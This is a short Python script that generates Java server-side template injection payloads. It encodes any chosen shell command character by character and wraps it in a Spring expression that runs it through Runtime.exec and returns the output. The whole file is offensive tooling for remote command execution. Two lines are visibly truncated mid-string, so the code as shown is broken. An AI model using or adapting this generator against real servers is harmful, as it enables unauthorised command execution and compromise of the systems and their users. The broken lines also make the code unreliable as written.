import argparse

parser = argparse.ArgumentParser(description='Java SSTI payload generator')
parser.add_argument('command', help='Command to execute')

args = parser.parse_args()
encoded_command = []

for character in args.command:
        encoded_command.append(ord(character))

payload_command = 'T(java.lang.Character).toString('+str(encoded_command[0])+')'
encoded_command.pop(0) 

for encoded_character in encoded_command:
        payload_command = payload_command+'.concat(T(java.lang.Character).toString('+str(encoded_character)+')>

payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('+payload_comman>

print(payload)
